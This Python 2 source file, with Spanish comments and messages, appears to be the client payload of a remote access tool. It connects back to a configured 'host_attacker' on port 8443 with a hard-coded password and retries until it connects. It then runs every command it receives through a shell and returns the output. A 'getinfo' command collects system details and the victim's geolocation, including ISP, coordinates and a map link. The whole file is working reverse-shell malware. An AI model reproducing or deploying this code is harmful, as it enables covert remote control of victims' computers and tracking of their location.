# -*- coding: UTF-8 -*-

from core.sdc import *
from core import geoip
from subprocess import PIPE, Popen
from time import sleep
import os
import platform
import sys

host_attacker = 'localhost'
port_attacker = 8443
password = "12345678901234567890123456789012"
repeticiones = 12
reintentar = 5

conexion = Connection(host_attacker, port_attacker, password, limit=1, repeat=repeticiones)

while True:

	try:

		conexion.client()

		break
		
	except connectError:
		
		sleep(reintentar)
		
		continue
	
while True:
	
	try:
	
		data = conexion.server_recv()
		if (data.split()[0].lower() == 'exit'):
			break
		elif (data.split()[0].lower() == 'cd'):
			ruta = data.replace(data.split()[0].lower()+" ", "")
			print ruta
			if (os.path.exists(ruta) and os.path.isdir(ruta)):
				os.chdir(ruta)
				conexion.server_interact("Directorio actual: %s" % (str(os.getcwd())))
			else:
				conexion.server_interact("La ruta no existe o no es un directorio")
		elif (data.split()[0].lower() == 'pwd'):
			conexion.server_interact("Directorio actual: %s" % (str(os.getcwd())))
		elif (data.split()[0].lower() == 'getinfo'):
			info = ''
			geolocalization_string = ''
			geolocalization = geoip.geolocation("localme")
			try:
				geolocalization.start()
				geolocalization_string += '# Informacion en la geolocalizacion: '
				geolocalization_string += ', Direccion: %s' % (str(geolocalization.query()))
				geolocalization_string += ', Asociacion: %s' % (str(geolocalization.association()))
				geolocalization_string += ', Ciudad: %s' % (str(geolocalization.city()))
				geolocalization_string += ', Pais: %s' % (str(geolocalization.country()))
				geolocalization_string += ', Codigo del pais: %s' % (str(geolocalization.countryCode()))
				geolocalization_string += ', Proveedor de servicios de internet: %s' % (str(geolocalization.isp()))
				geolocalization_string += ', Organizacion: %s' % (str(geolocalization.organization()))
				geolocalization_string += ', Region: %s' % (str(geolocalization.region()))
				geolocalization_string += ', Nombre de la region: %s' % (str(geolocalization.regionName()))
				geolocalization_string += ', Zona horaria: %s' % (str(geolocalization.timezone()))
				geolocalization_string += ', Codigo ZIP: %s' % (str(geolocalization.zipCode()))
				geolocalization_string += ', Latitud: %s' % (str(geolocalization.latitude()))
				geolocalization_string += ', Longitud: %s' % (str(geolocalization.longitude()))
				geolocalization_string += ', Mapa de google: %s' % (str(geolocalization.google_maps()))
			except:
				pass
			
			info += "Sistema Operativo: " + platform.system() + " " + platform.release()
			info += "\nVersion del Sistema Operativo: " + platform.version()
			info += "\nProcesador: " + platform.processor()
			info += "\nTipo de maquina: " + platform.machine()
			info += "\nAquitectura de la carga util: " + platform.architecture(sys.argv[0])[0]
			info += geolocalization_string
			
			conexion.server_interact(info)
			
		else:
			a,b = Popen(str(data.strip()), shell=True, stderr=PIPE, stdout=PIPE, stdin=PIPE).communicate()
			result = a+b
			conexion.server_interact(result)
			
	except Exception as a:
		
		try:
			
			conexion.server_interact("Exception: %s" % (str(a)))
			
		except:
			
			continue